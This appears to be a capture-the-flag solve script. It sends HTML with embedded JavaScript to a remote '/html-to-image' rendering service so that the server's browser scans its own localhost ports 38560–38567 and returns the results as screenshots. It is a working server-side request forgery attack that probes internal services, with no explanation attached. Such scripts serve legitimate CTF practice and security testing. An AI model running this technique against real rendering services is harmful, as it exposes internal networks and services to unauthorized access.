import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/sc_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:120]}')
            return False
        except Exception as e:
            time.sleep(2)
    return False

# Async fetch all ports. Keep DOM updating so render waits. Use AbortController for per-fetch timeout.
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:15px;white-space:pre-wrap;padding:10px}</style></head><body><div id=o>scanning...</div><script>
var out=document.getElementById('o');
var results={};
var done=0, total=8;
function upd(){var s='';for(var k in results){s+=k+" => "+results[k]+"\n";}out.textContent=s;}
for(var p=38560;p<=38567;p++){
  (function(port){
    var ctrl=new AbortController();
    var t=setTimeout(function(){ctrl.abort();},3500);
    fetch("http://localhost:"+port+"/status",{signal:ctrl.signal})
      .then(function(r){return r.text();})
      .then(function(tx){clearTimeout(t);results[port]="LIVE "+tx.substring(0,90);done++;upd();})
      .catch(function(e){clearTimeout(t);results[port]="dead";done++;upd();});
  })(p);
}
</script></body></html>'''
render(js, 'scan')
